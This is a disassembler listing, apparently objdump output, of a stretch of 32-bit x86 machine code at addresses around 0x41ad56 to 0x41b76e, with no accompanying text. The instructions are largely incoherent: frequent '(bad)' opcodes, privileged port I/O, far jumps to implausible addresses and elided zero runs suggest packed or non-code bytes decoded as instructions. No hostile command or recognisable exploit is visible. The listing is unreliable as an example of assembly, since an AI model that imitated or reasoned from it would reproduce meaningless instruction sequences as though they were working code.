  41ad56:	(bad)  
  41ad57:	fnstenv [ebp+ebp*8-0x755f7b67]
  41ad5e:	inc    ecx
  41ad5f:	mov    WORD PTR [ebp+0x7844e83c],gs
  41ad65:	sub    dl,dh
  41ad67:	push   0x2fce294c
  41ad6c:	fcmovbe st,st(1)
  41ad6e:	sar    BYTE PTR [edx+0x12],0x56
  41ad72:	add    BYTE PTR [ebx],bh
  41ad74:	ins    BYTE PTR es:[edi],dx
  41ad75:	xor    dl,BYTE PTR [esi]
  41ad77:	xchg   BYTE PTR [esi],dh
  41ad79:	sbb    DWORD PTR [edi],esi
  41ad7b:	mov    dh,0x43
  41ad7d:	shl    BYTE PTR [ecx],cl
  41ad7f:	bound  edx,QWORD PTR [ebp+0x558d19da]
  41ad85:	xchg   ebx,eax
  41ad86:	jmp    0xb4065b7e
  41ad8b:	iret   
  41ad8c:	and    bh,dh
  41ad8e:	xchg   ebx,eax
  41ad8f:	cmp    esi,DWORD PTR [ecx]
	...
  41adf1:	add    BYTE PTR [eax],al
  41adf3:	add    BYTE PTR [ebp-0x8],dl
  41adf6:	or     DWORD PTR [esi-0x4280053],ebx
  41adfc:	dec    edi
  41adfd:	push   eax
  41adfe:	cmp    DWORD PTR [edi+esi*8+0x4ed2a6fa],esp
  41ae05:	sbb    eax,0x1050001
  41ae0a:	add    BYTE PTR [eax],al
  41ae0c:	in     eax,0x8e
  41ae0e:	(bad)  
  41ae0f:	mov    ch,0xd2
  41ae11:	xchg   ebp,eax
  41ae12:	mov    ebx,0x32ad6ae3
  41ae17:	cwde   
  41ae18:	jbe    0x41adc4
  41ae1a:	inc    ebx
  41ae1b:	lahf   
  41ae1c:	jl     0x41ade2
  41ae1e:	xchg   esp,eax
  41ae1f:	mov    edi,0xbaf7dad6
  41ae24:	pop    ecx
  41ae25:	(bad)  
  41ae26:	push   edx
  41ae27:	jge    0x41ae6f
  41ae29:	sub    al,0xef
  41ae2b:	mov    cs,WORD PTR [bp+0xa]
  41ae2f:	jb     0x41ae9f
  41ae31:	jno    0x41aea4
  41ae33:	rcl    BYTE PTR [ebp-0x2c],0x51
  41ae37:	add    DWORD PTR [ebp-0x66d485e],eax
  41ae3d:	jb     0x41ae2d
  41ae3f:	and    ebx,DWORD PTR [edi]
  41ae41:	sub    ebp,DWORD PTR [ecx]
  41ae43:	out    0xed,al
  41ae45:	sub    DWORD PTR [ecx],0x3c
  41ae48:	or     dh,BYTE PTR [ebx-0x4272da66]
  41ae4e:	mov    dl,BYTE PTR [ebp+0x679e343c]
  41ae54:	xchg   esi,eax
  41ae55:	mov    edx,0xbb2312f
  41ae5a:	lods   al,BYTE PTR ds:[esi]
  41ae5b:	arpl   WORD PTR ds:0x39bd6d2b,sp
  41ae61:	add    DWORD PTR [esi-0x5a],edi
  41ae64:	fcmovnb st,st(7)
  41ae66:	loopne 0x41aec3
  41ae68:	add    eax,0xc0ae99ed
  41ae6d:	outs   dx,DWORD PTR ds:[esi]
  41ae6e:	neg    BYTE PTR [ebx+0x50]
  41ae71:	rcr    DWORD PTR [esi],cl
  41ae73:	and    edx,0xaf6ad054
  41ae79:	sahf   
  41ae7a:	in     eax,0x8b
  41ae7c:	jl     0x41ae89
  41ae7e:	jmp    0x41ae8c
  41ae80:	test   eax,0x6400685
  41ae85:	aam    0x11
  41ae87:	push   ebp
  41ae88:	mov    al,0x30
  41ae8a:	jb     0x41ae59
  41ae8c:	xchg   esi,eax
  41ae8d:	and    BYTE PTR [ecx-0x4a7eed5f],0x47
  41ae94:	sub    BYTE PTR [ecx-0x66d61eba],bh
  41ae9a:	inc    edi
  41ae9b:	les    ecx,FWORD PTR [ebp+0x6381ca0e]
  41aea1:	out    dx,eax
  41aea2:	push   0xa1713aa5
  41aea7:	fbstp  TBYTE PTR [ebx]
  41aea9:	fwait
  41aeaa:	pop    ss
  41aeab:	jnp    0x41aebd
  41aead:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aeae:	mov    BYTE PTR [eax+0x56],al
  41aeb1:	jecxz  0x41ae51
  41aeb3:	inc    edx
  41aeb4:	int3   
  41aeb5:	ret    0x5de4
  41aeb8:	xchg   edx,eax
  41aeb9:	push   ds
  41aeba:	mov    ds:0xcfd5e276,eax
  41aebf:	adc    bl,cl
  41aec1:	xchg   si,ax
  41aec3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aec4:	pop    ebp
  41aec5:	pop    esi
  41aec6:	aad    0xf4
  41aec8:	push   ss
  41aec9:	les    ebp,FWORD PTR [ecx]
  41aecb:	push   0xffffffb7
  41aecd:	jmp    0x9c56:0x8b3f74f
  41aed4:	fidiv  DWORD PTR [ebx+0x47a2e6dd]
  41aeda:	popa   
  41aedb:	jbe    0x41ae7d
  41aedd:	mov    es,ecx
  41aedf:	jecxz  0x41aecb
  41aee1:	clc    
  41aee2:	push   edi
  41aee3:	(bad)  
  41aee5:	push   es
  41aee6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aee7:	jp     0x41aef5
  41aee9:	and    edi,ecx
  41aeeb:	fisub  DWORD PTR [edx-0x2dc10fb3]
  41aef1:	nop
  41aef2:	fdiv   DWORD PTR [edi+edi*8-0x68a31c6e]
  41aef9:	or     ah,BYTE PTR [eax+0x4d]
  41aefc:	rcl    BYTE PTR [ebx+0x430299ab],cl
  41af02:	mov    bl,0x81
  41af04:	mov    es,WORD PTR [esi+0x791e5d76]
  41af0a:	sbb    BYTE PTR [ebp+0x60],al
  41af0d:	aam    0x9b
  41af0f:	sar    DWORD PTR [eax+eax*1+0x0],0x0
	...
  41af73:	add    ch,al
  41af75:	stc    
  41af76:	lods   eax,DWORD PTR ds:[esi]
  41af77:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41af7d:	mov    ecx,0x470944ee
  41af82:	push   ecx
  41af83:	fst    DWORD PTR [ebx+0x1e]
  41af86:	add    DWORD PTR [eax],eax
  41af88:	add    eax,0x27000001
  41af8d:	xlat   BYTE PTR ds:[ebx]
  41af8e:	not    edx
  41af90:	mov    ah,dh
  41af92:	enter  0x721,0x2b
  41af96:	pop    es
  41af97:	sub    eax,0x95084355
  41af9c:	sbb    eax,0x79c1dc9d
  41afa1:	mov    esp,0x449f95eb
  41afa6:	xchg   ebp,eax
  41afa7:	inc    esp
  41afa8:	cmp    BYTE PTR [ebp-0x3c96e669],ch
  41afae:	sub    dh,BYTE PTR [edx-0x3e8d3bf8]
  41afb4:	sbb    BYTE PTR [ebx+0x54],ch
  41afb7:	out    0x69,al
  41afb9:	dec    ebx
  41afba:	test   al,0x55
  41afbc:	enter  0x11e6,0xf0
  41afc0:	inc    ebx
  41afc1:	and    al,0x63
  41afc3:	jns    0x41af76
  41afc5:	and    DWORD PTR [esi+0x18c2899e],0x69fcd7de
  41afcf:	pop    ecx
  41afd0:	jmp    0x41af62
  41afd2:	sbb    al,0x59
  41afd4:	(bad)  
  41afd6:	ror    ch,cl
  41afd8:	mov    ch,0xbc
  41afda:	cli    
  41afdb:	cmp    DWORD PTR [ebp-0x65509673],ebp
  41afe1:	pushf  
  41afe2:	push   DWORD PTR [edi+0x62]
  41afe5:	test   al,0x37
  41afe7:	and    al,0xbb
  41afe9:	ret    0xd939
  41afec:	in     eax,dx
  41afed:	cli    
  41afee:	imul   ebp,DWORD PTR [edi+0x27a76427],0xffffffd1
  41aff5:	pop    ds
  41aff6:	and    DWORD PTR [eax+0x10],ebp
  41aff9:	inc    eax
  41affa:	jne    0x41b077
  41affc:	call   DWORD PTR [edi-0x72]
  41afff:	jbe    0x41afbf
  41b001:	adc    DWORD PTR [esi],0xffffff85
  41b004:	clc    
  41b005:	mov    ebx,0xe071efc8
  41b00a:	call   0xa386:0xb7c7de1c
  41b011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b012:	sbb    edx,DWORD PTR [eax+0x8a35c56]
  41b018:	and    al,ah
  41b01a:	out    dx,al
  41b01b:	imul   edx,DWORD PTR [esi],0x15
  41b01e:	in     eax,0xe5
  41b020:	sti    
  41b021:	clc    
  41b022:	js     0x41b001
  41b024:	mov    es,WORD PTR fs:[ebx]
  41b027:	sbb    al,0x2f
  41b029:	or     ecx,DWORD PTR [ebx]
  41b02b:	mov    esp,0x8858da0b
  41b030:	dec    ebp
  41b031:	xlat   BYTE PTR ds:[ebx]
  41b032:	add    eax,0xef84114e
  41b037:	ins    DWORD PTR es:[edi],dx
  41b038:	div    DWORD PTR [ecx]
  41b03a:	xchg   ebx,eax
  41b03b:	pusha  
  41b03c:	xor    ch,BYTE PTR [ecx+0x3f721e39]
  41b042:	cli    
  41b043:	ret    0x3555
  41b046:	xor    al,0x33
  41b048:	fistp  WORD PTR [ecx+ebp*2]
  41b04b:	pop    edi
  41b04c:	pusha  
  41b04d:	adc    bh,dh
  41b04f:	fisttp QWORD PTR [edx]
  41b051:	daa    
  41b052:	jnp    0x41b051
  41b054:	sub    BYTE PTR [eax-0x7e],bl
  41b057:	jbe    0x41b02f
  41b059:	or     edi,ebp
  41b05b:	mov    edi,0x204e202a
  41b060:	xor    esi,ecx
  41b062:	adc    bh,BYTE PTR [ecx]
  41b064:	sbb    ah,bh
  41b066:	adc    ecx,DWORD PTR [ecx-0x63]
  41b069:	ds push edi
  41b06b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b06c:	repnz push ebx
  41b06e:	loope  0x41b0ec
  41b070:	ficomp WORD PTR [ecx+0x380dbd6b]
  41b076:	and    BYTE PTR [eax+0x60596dc5],cl
  41b07c:	mov    al,0x47
  41b07e:	setg   BYTE PTR [edi]
  41b081:	in     al,0x80
  41b083:	xchg   BYTE PTR [ebx+0x424762ad],ah
  41b089:	sub    BYTE PTR [ebx+0x4c],al
  41b08c:	mov    BYTE PTR [esi+0xd69961],dh
	...
  41b0f2:	add    BYTE PTR [eax],al
  41b0f4:	(bad)  
  41b0f5:	ficom  WORD PTR [eax]
  41b0f7:	stos   DWORD PTR es:[edi],eax
  41b0f8:	sbb    bh,ch
  41b0fa:	(bad)  
  41b0fb:	call   DWORD PTR [edx+edx*8+0x75]
  41b0ff:	mov    edi,0x2f456967
  41b104:	pop    eax
  41b105:	pop    ds
  41b106:	add    DWORD PTR [eax],eax
  41b108:	add    eax,0x97000001
  41b10d:	ss cmp al,0x69
  41b110:	test   eax,0x6f6a50cf
  41b115:	jecxz  0x41b0e2
  41b117:	mov    BYTE PTR [edx+ebx*4],dh
  41b11a:	jp     0x41b0cb
  41b11c:	out    0x3f,eax
  41b11e:	pop    ds
  41b11f:	and    BYTE PTR [eax],dh
  41b121:	mov    dh,0x60
  41b123:	mov    eax,0xdc816250
  41b128:	dec    edi
  41b129:	pop    ebp
  41b12a:	adc    ebp,edi
  41b12c:	or     BYTE PTR [edi+0x61c360a6],dh
  41b132:	mov    ah,0x2d
  41b134:	out    dx,eax
  41b135:	push   0xfffffff9
  41b137:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b138:	sahf   
  41b139:	gs sub al,0xe2
  41b13c:	jge    0x41b177
  41b13e:	fnsave [esi+0x236a9244]
  41b144:	push   ss
  41b145:	jmp    0x4f21:0x1272ecc0
  41b14c:	enter  0xf91f,0xf5
  41b150:	or     esi,DWORD PTR [edx+0x35f941a7]
  41b156:	(bad)  
  41b157:	mov    ch,0x2a
  41b159:	push   ecx
  41b15a:	test   BYTE PTR [ecx+esi*2],cl
  41b15d:	loopne 0x41b165
  41b15f:	jg     0x41b0e5
  41b161:	(bad)  
  41b162:	in     eax,dx
  41b163:	loopne 0x41b0ef
  41b165:	push   ecx
  41b166:	add    eax,0x997e52c8
  41b16b:	mov    bh,0xd5
  41b16d:	and    edx,DWORD PTR [ecx+0x4f]
  41b170:	fadd   QWORD PTR [ecx+0x1f]
  41b173:	xchg   edx,eax
  41b174:	retf   
  41b175:	push   0xd77bec86
  41b17a:	mov    esi,0x6f36bd57
  41b17f:	out    dx,eax
  41b180:	xchg   edx,eax
  41b181:	pcmpeqd mm1,mm5
  41b184:	jp     0x41b10c
  41b186:	sbb    cl,BYTE PTR [ebx]
  41b188:	das    
  41b189:	rcl    BYTE PTR gs:[ecx+0x2a],1
  41b18d:	and    BYTE PTR [esi],al
  41b18f:	in     al,dx
  41b190:	sub    ch,BYTE PTR [ecx+0x74]
  41b193:	inc    eax
  41b194:	push   edx
  41b195:	enter  0x728a,0x5e
  41b199:	rcr    edx,1
  41b19b:	push   0xbc5f7c70
  41b1a0:	std    
  41b1a1:	jle    0x41b12c
  41b1a3:	cs ja  0x41b1d6
  41b1a6:	mov    al,0x5e
  41b1a8:	sub    eax,DWORD PTR [esi-0x3c59bd0f]
  41b1ae:	call   0xdc596a6a
  41b1b3:	je     0x41b14f
  41b1b5:	xchg   ecx,eax
  41b1b6:	mul    DWORD PTR [edx+0x52]
  41b1b9:	sub    BYTE PTR [ebp-0x4b649c7e],dh
  41b1bf:	int3   
  41b1c0:	sub    DWORD PTR [eax],edx
  41b1c2:	xchg   edi,eax
  41b1c3:	in     eax,dx
  41b1c4:	xor    esi,eax
  41b1c6:	jl     0x41b191
  41b1c8:	fdiv   QWORD PTR [esi+ecx*4+0x247822d2]
  41b1cf:	fs mov ah,0x16
  41b1d2:	sahf   
  41b1d3:	push   ebp
  41b1d4:	adc    bl,ch
  41b1d6:	and    BYTE PTR fs:[ecx+0x3f],bl
  41b1da:	pop    es
  41b1db:	add    DWORD PTR [edx+ebp*1+0x5f8b32ed],ecx
  41b1e2:	(bad)
  41b1e5:	mov    ch,0xdd
  41b1e7:	sbb    dh,BYTE PTR [ebx]
  41b1e9:	xchg   ecx,eax
  41b1ea:	adc    eax,0x2a0cba6b
  41b1ef:	femms  
  41b1f1:	sub    eax,0x560b846a
  41b1f6:	adc    al,0xdb
  41b1f8:	cs (bad) 
  41b1fa:	jbe    0x41b248
  41b1fc:	mov    al,0x58
  41b1fe:	inc    eax
  41b1ff:	push   esi
  41b200:	cmp    ah,BYTE PTR [edx+0x1e]
  41b203:	(bad)  
  41b204:	fild   WORD PTR [ebx]
  41b206:	cwde   
  41b207:	je     0x41b280
  41b209:	and    esi,DWORD PTR [edi]
  41b20b:	setg   bh
  41b20e:	das    
  41b20f:	push   esi
  41b210:	mov    esp,0x0
	...
  41b271:	add    BYTE PTR [eax],al
  41b273:	add    BYTE PTR [esi+0x6be069a5],cl
  41b279:	in     al,dx
  41b27a:	(bad)  
  41b27b:	out    dx,eax
  41b27c:	stos   BYTE PTR es:[edi],al
  41b27d:	jge    0x41b21a
  41b27f:	or     BYTE PTR [esi+edx*1],dh
  41b282:	clc    
  41b283:	daa    
  41b284:	pop    ebp
  41b285:	and    BYTE PTR [ecx],al
  41b287:	add    BYTE PTR ds:0xd1000001,al
  41b28d:	fimul  DWORD PTR [eax+ebp*1]
  41b290:	or     ebx,ebx
  41b292:	and    dl,BYTE PTR [ecx]
  41b294:	push   es
  41b295:	mov    bh,0x46
  41b297:	enter  0xfeff,0xc4
  41b29b:	push   ebx
  41b29c:	(bad)  
  41b29d:	push   eax
  41b29e:	adc    eax,0xcdefb190
  41b2a3:	xchg   esi,eax
  41b2a4:	and    dl,bh
  41b2a6:	imul   ecx,DWORD PTR [edi],0x2dddd3dd
  41b2ac:	les    esi,FWORD PTR [edi+ebp*1+0x371dae15]
  41b2b3:	(bad)
  41b2b6:	xchg   BYTE PTR ds:0x62cc5fdf,bh
  41b2bc:	pushf  
  41b2bd:	mov    bh,0x4f
  41b2bf:	add    ecx,esp
  41b2c1:	sahf   
  41b2c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2c3:	jae    0x41b2b6
  41b2c5:	ret    0x1c1d
  41b2c8:	mov    esi,0x3c763677
  41b2cd:	ins    BYTE PTR es:[edi],dx
  41b2ce:	xor    eax,0x20d55a5b
  41b2d3:	(bad)  
  41b2d4:	mov    dl,0x1
  41b2d6:	popa   
  41b2d7:	sbb    bl,BYTE PTR [ebx-0x23ecc3ec]
  41b2dd:	add    al,0x60
  41b2df:	lds    esi,FWORD PTR [ebp-0x6f]
  41b2e2:	sub    al,0xa2
  41b2e4:	xor    ebp,ebx
  41b2e6:	sub    edx,eax
  41b2e8:	cld    
  41b2e9:	sti    
  41b2ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2eb:	inc    edx
  41b2ec:	cmp    ebp,DWORD PTR [ecx-0x5c]
  41b2ef:	mov    ds:0x4ec54f2c,al
  41b2f4:	cmc    
  41b2f5:	das    
  41b2f6:	and    ebx,0x8cd514b7
  41b2fc:	cwde   
  41b2fd:	shr    BYTE PTR [esi-0x4c8a11d2],1
  41b303:	push   edi
  41b304:	lea    esp,[edi+0x54]
  41b307:	sbb    esp,ebp
  41b309:	mov    BYTE PTR [eax+0x320131c9],0x53
  41b310:	outs   dx,DWORD PTR ds:[esi]
  41b311:	mov    DWORD PTR [ebp+0x4d],ecx
  41b314:	loope  0x41b301
  41b316:	ret    
  41b317:	jl     0x41b33f
  41b319:	(bad)  
  41b31a:	stos   DWORD PTR es:[edi],eax
  41b31b:	ret    0x7c13
  41b31e:	jno    0x41b361
  41b320:	sub    edx,DWORD PTR [ebp+edi*4-0x4729953]
  41b327:	retf   
  41b328:	stos   BYTE PTR es:[edi],al
  41b329:	rcl    ecx,cl
  41b32b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b32c:	and    al,0xd1
  41b32e:	and    ecx,0xfffffffa
  41b331:	das    
  41b332:	aas    
  41b333:	inc    ebx
  41b334:	and    bl,ch
  41b336:	adc    al,0xd7
  41b338:	cmp    ebx,DWORD PTR [eax+0x31]
  41b33b:	neg    DWORD PTR [ecx-0x2a]
  41b33e:	push   edi
  41b33f:	jb     0x41b380
  41b341:	pop    esp
  41b342:	mov    cl,0x99
  41b344:	jb     0x41b39f
  41b346:	data16 sbb al,0x23
  41b349:	mov    edi,0xf55e8834
  41b34e:	je     0x41b36e
  41b350:	dec    eax
  41b351:	mov    edx,0x34c16b37
  41b356:	push   0xffffffba
  41b358:	test   esp,esi
  41b35a:	mov    DWORD PTR ds:0x3b1d3417,esp
  41b360:	sub    ah,cl
  41b362:	test   BYTE PTR [ebx-0x1e9440bf],bh
  41b368:	xchg   esp,eax
  41b369:	fisttp WORD PTR [edx]
  41b36b:	shr    BYTE PTR fs:[esi+eiz*2+0x2a],cl
  41b370:	rcl    BYTE PTR [edx],1
  41b372:	push   edx
  41b373:	in     al,dx
  41b374:	xor    al,0xf0
  41b376:	sub    eax,0x636f472c
  41b37b:	adc    ebx,DWORD PTR [ebx]
  41b37d:	lods   al,BYTE PTR ds:[esi]
  41b37e:	push   0x7b
  41b380:	pop    edx
  41b381:	fdecstp 
  41b383:	mov    DWORD PTR [ebp+0x6e6dea7e],eax
  41b389:	rol    DWORD PTR [eax],cl
  41b38b:	mov    ch,0x21
  41b38d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b38e:	pushf  
  41b38f:	push   esi
  41b390:	das    
	...
  41b3f1:	add    BYTE PTR [eax],al
  41b3f3:	add    BYTE PTR [eax+0xd],cl
  41b3f6:	sbb    eax,0xfebb5dab
  41b3fb:	out    dx,eax
  41b3fc:	xchg   ebp,eax
  41b3fd:	iret   
  41b3fe:	push   ebx
  41b3ff:	aas    
  41b400:	sbb    dx,WORD PTR [esi+0x4]
  41b404:	bound  esp,QWORD PTR [ecx]
  41b406:	add    DWORD PTR [eax],eax
  41b408:	add    eax,0x7a000001
  41b40d:	sub    al,0x62
  41b40f:	push   edx
  41b410:	push   ebx
  41b411:	loop   0x41b3b6
  41b413:	pop    es
  41b414:	repnz adc DWORD PTR [ebp-0xdb46c16],ebx
  41b41b:	push   ds
  41b41c:	inc    edi
  41b41d:	bnd jge 0x41b3af
  41b420:	pop    DWORD PTR cs:[edx+0x112217c8]
  41b427:	(bad)  
  41b428:	pushf  
  41b429:	outs   dx,BYTE PTR ds:[esi]
  41b42a:	push   ds
  41b42b:	or     al,0xb7
  41b42d:	and    BYTE PTR [edi],bl
  41b42f:	push   esp
  41b430:	adc    al,0x9
  41b432:	mov    ch,0x97
  41b434:	shl    DWORD PTR [edx],0x8d
  41b437:	enter  0x821b,0x89
  41b43b:	es in  eax,0x76
  41b43e:	out    dx,al
  41b43f:	stc    
  41b440:	mov    BYTE PTR [ebp+ebp*1-0x67],0x74
  41b445:	cmp    eax,0x8dda0d68
  41b44a:	adc    BYTE PTR [edx+ebx*8+0x17c27915],dl
  41b451:	jbe    0x41b3df
  41b453:	jl     0x41b4b6
  41b455:	inc    edx
  41b456:	(bad)  
  41b457:	inc    esp
  41b458:	cs aas 
  41b45a:	inc    edi
  41b45b:	xchg   edi,eax
  41b45c:	fs jb  0x41b48c
  41b45f:	xlat   BYTE PTR ds:[ebx]
  41b460:	sar    BYTE PTR [eax],0x0
  41b463:	(bad)  
  41b464:	sar    BYTE PTR [ebp-0x41979194],1
  41b46a:	daa    
  41b46b:	pop    esp
  41b46c:	or     eax,0x37496903
  41b471:	add    eax,0x521593d0
  41b476:	mov    al,0x26
  41b478:	loopne 0x41b403
  41b47a:	jbe    0x41b4f7
  41b47c:	xchg   esi,eax
  41b47d:	sar    BYTE PTR [eax+0x71c896d4],1
  41b483:	or     BYTE PTR [esi+ebp*1],dh
  41b486:	retf   
  41b487:	mov    ecx,0x133c8c6b
  41b48c:	xor    ebx,ebp
  41b48e:	out    0x9e,al
  41b490:	lds    eax,FWORD PTR [edi]
  41b492:	adc    BYTE PTR [esi+0x6ae91c0e],ah
  41b498:	lahf   
  41b499:	stos   BYTE PTR es:[edi],al
  41b49a:	div    BYTE PTR [esi+0x67c306ac]
  41b4a0:	pop    esp
  41b4a1:	cmp    dh,BYTE PTR [ebx]
  41b4a3:	xchg   ebp,eax
  41b4a4:	sbb    ecx,DWORD PTR [edx+0x8d9724d]
  41b4aa:	sub    bl,BYTE PTR [edx]
  41b4ac:	sbb    esi,edx
  41b4ae:	rcl    BYTE PTR [ecx-0x24d32459],1
  41b4b4:	sbb    ecx,DWORD PTR [ebx-0x25e983fe]
  41b4ba:	int3   
  41b4bb:	dec    eax
  41b4bc:	mov    cl,BYTE PTR [ebx+0x2b]
  41b4bf:	or     BYTE PTR [edx+0x23],dh
  41b4c2:	rcr    DWORD PTR [eax-0x789d9db6],0xce
  41b4c9:	cld    
  41b4ca:	sbb    DWORD PTR [eax],ebx
  41b4cc:	jo     0x41b4a5
  41b4ce:	ins    BYTE PTR es:[edi],dx
  41b4cf:	out    dx,al
  41b4d0:	jo     0x41b4d3
  41b4d2:	imul   ebp,DWORD PTR [eax+0x339d7ca2],0xffffff88
  41b4d9:	pop    ebp
  41b4db:	mov    ebx,0x457896ba
  41b4e0:	test   al,0xe6
  41b4e2:	(bad)  
  41b4e3:	hlt    
  41b4e4:	sub    BYTE PTR [edi],0xa7
  41b4e7:	mov    ?,WORD PTR [esi]
  41b4e9:	jp     0x41b543
  41b4eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4ec:	mov    edi,0x4afed301
  41b4f1:	fcom   QWORD PTR [esi-0x77]
  41b4f4:	add    eax,0x4242d3c
  41b4f9:	mov    edi,0xd364988d
  41b4fe:	mov    ecx,0x3b7bf5b4
  41b503:	jecxz  0x41b56a
  41b505:	jp     0x41b54b
  41b507:	dec    edi
  41b508:	mov    dh,0x89
  41b50a:	xor    BYTE PTR [esi],dl
  41b50c:	mov    cl,al
  41b50e:	das    
  41b50f:	loop   0x41b588
	...
  41b571:	add    BYTE PTR [eax],al
  41b573:	add    ah,dl
  41b575:	in     al,dx
  41b576:	add    edi,edi
  41b578:	cmp    edi,edi
  41b57a:	(bad)  
  41b57b:	out    dx,eax
  41b57c:	loope  0x41b544
  41b57e:	jns    0x41b561
  41b580:	add    ch,BYTE PTR [edi+0x2267087f]
  41b586:	add    DWORD PTR [eax],eax
  41b588:	add    eax,0x36000001
  41b58d:	push   es
  41b58e:	or     edx,DWORD PTR [ebp+edi*8-0x3e]
  41b592:	mov    dl,0x2b
  41b594:	mov    bl,0x23
  41b596:	fimul  DWORD PTR [esi+edx*2]
  41b599:	xor    ch,BYTE PTR [esi-0x68]
  41b59c:	sub    al,0x2e
  41b59e:	mov    DWORD PTR [ebp-0x2e69cc20],esi
  41b5a4:	xor    eax,0xc83b5fee
  41b5a9:	shl    BYTE PTR [esi-0x7d59c6e5],cl
  41b5af:	dec    edx
  41b5b0:	fmul   DWORD PTR [edi+0x61e89a9a]
  41b5b6:	add    eax,DWORD PTR [ecx+ebp*8-0x25]
  41b5ba:	cvtps2pi mm2,QWORD PTR [edx+0x66]
  41b5be:	test   edi,ebx
  41b5c0:	lock mov al,0x68
  41b5c3:	cpuid  
  41b5c5:	sbb    ah,BYTE PTR [esi]
  41b5c7:	imul   eax,DWORD PTR ds:0xa9f704a9,0xfe68f1f9
  41b5d1:	int3   
  41b5d2:	cwde   
  41b5d3:	mov    ?,WORD PTR [edx]
  41b5d5:	test   DWORD PTR [ecx],ebp
  41b5d7:	xor    al,0xe
  41b5d9:	fdivrp st(2),st
  41b5db:	data16 shl BYTE PTR [ebx+0x7d],0x24
  41b5e0:	xor    BYTE PTR [ebx],al
  41b5e2:	shl    BYTE PTR [edx],0x29
  41b5e5:	shl    cl,1
  41b5e7:	leave  
  41b5e8:	add    eax,0x3479f0d7
  41b5ed:	cmp    ch,ch
  41b5ef:	push   esp
  41b5f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b5f1:	icebp  
  41b5f2:	jmp    0x41b670
  41b5f4:	outs   dx,BYTE PTR ds:[esi]
  41b5f5:	push   edx
  41b5f6:	sbb    DWORD PTR [edi+ebp*4],ebp
  41b5f9:	shl    BYTE PTR [ebx-0x34deafff],1
  41b5ff:	add    DWORD PTR [ebp+0x47],ecx
  41b602:	mov    edi,0x35bb7457
  41b607:	imul   ebp,DWORD PTR [edx+edx*4+0x772ecf20],0xa567803f
  41b612:	(bad)  
  41b613:	shl    bl,cl
  41b615:	mov    ch,0xbd
  41b617:	das    
  41b618:	mov    ebp,0x9eeabaf4
  41b61d:	scas   eax,DWORD PTR es:[edi]
  41b61e:	pop    esp
  41b61f:	mov    al,ds:0x332655e8
  41b624:	xchg   esi,eax
  41b625:	add    DWORD PTR [edx],edx
  41b627:	sbb    eax,0x5603f3fe
  41b62c:	imul   ecx,ecx,0x8c9294c8
  41b632:	sbb    ah,BYTE PTR [bx+di]
  41b635:	push   ds
  41b636:	or     DWORD PTR [eax],eax
  41b638:	pop    es
  41b639:	lahf   
  41b63a:	pop    ds
  41b63b:	pop    ebp
  41b63c:	and    eax,0xfb4c0394
  41b641:	xchg   ecx,eax
  41b642:	in     eax,0xb
  41b644:	jbe    0x41b699
  41b646:	jnp    0x41b681
  41b648:	push   ss
  41b649:	add    al,0xa1
  41b64b:	rol    al,1
  41b64d:	fimul  DWORD PTR [edx-0x16]
  41b650:	cmp    ah,0xb0
  41b653:	cli    
  41b654:	add    ebx,DWORD PTR [ebx+0x33]
  41b657:	dec    edi
  41b658:	jge    0x41b649
  41b65a:	cmp    eax,0x9e3e240e
  41b65f:	mov    edx,0xdfb37946
  41b664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b665:	test   BYTE PTR [ebp+0x34],cl
  41b668:	mov    ds:0x48fef54e,al
  41b66d:	out    dx,eax
  41b66e:	mov    ds:0xa53f3567,al
  41b673:	cld    
  41b674:	sbb    DWORD PTR [eax-0x78],0x6e
  41b678:	mov    ecx,DWORD PTR [ebx]
  41b67a:	test   BYTE PTR [edx+ebp*2],cl
  41b67d:	and    esi,DWORD PTR [edx]
  41b67f:	call   0x1e5d4301
  41b684:	mov    DWORD PTR [eax],eax
  41b686:	push   ds
  41b687:	push   ebp
  41b688:	inc    esi
  41b689:	std    
  41b68a:	push   eax
  41b68b:	mov    ebp,edx
  41b68d:	jmp    esp
  41b68f:	push   eax
  41b690:	nop
	...
  41b6f1:	add    BYTE PTR [eax],al
  41b6f3:	add    BYTE PTR [eax-0x2469e49d],ch
  41b6f9:	(bad)  
  41b6fa:	lods   eax,DWORD PTR ds:[esi]
  41b6fb:	jg     0x41b6f8
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	jmp    0x6d363121
  41b705:	and    eax,DWORD PTR [ecx]
  41b707:	add    BYTE PTR ds:0x83000001,al
  41b70d:	ds sbb eax,0x6fc4fe08
  41b713:	imul   edi,DWORD PTR [eax+0xe84cd5b],0x5a
  41b71a:	mov    cl,0xb
  41b71c:	mov    ds:0x8507ed03,eax
  41b721:	repz pusha 
  41b723:	sahf   
  41b724:	das    
  41b725:	fmul   st,st(5)
  41b727:	push   esi
  41b728:	xlat   BYTE PTR ds:[ebx]
  41b729:	lahf   
  41b72a:	xor    eax,0x6b3c1eeb
  41b72f:	fld    TBYTE PTR gs:[edi+0x1]
  41b733:	adc    ah,ch
  41b735:	imul   BYTE PTR [ecx-0x1f]
  41b738:	test   DWORD PTR [ecx+0xbdf3bb1],eax
  41b73e:	cmp    al,0x86
  41b740:	shr    DWORD PTR [edx],1
  41b742:	fisub  DWORD PTR [ecx]
  41b744:	mov    dh,0x6c
  41b746:	push   ds
  41b747:	mov    eax,ds:0x3cc305bd
  41b74c:	lds    ecx,FWORD PTR ds:0xc8988850
  41b752:	mov    bh,0x24
  41b754:	jne    0x41b7a3
  41b756:	mov    eax,ds:0x65b66e51
  41b75b:	call   0xdeaa:0x9f5a
  41b761:	retf   
  41b762:	sub    DWORD PTR [ebx+0x6c],eax
  41b765:	mov    esp,0xcae1be8
  41b76a:	popf   
  41b76b:	mov    cl,0x8
  41b76d:	popf   
  41b76e:	or     dh,cl
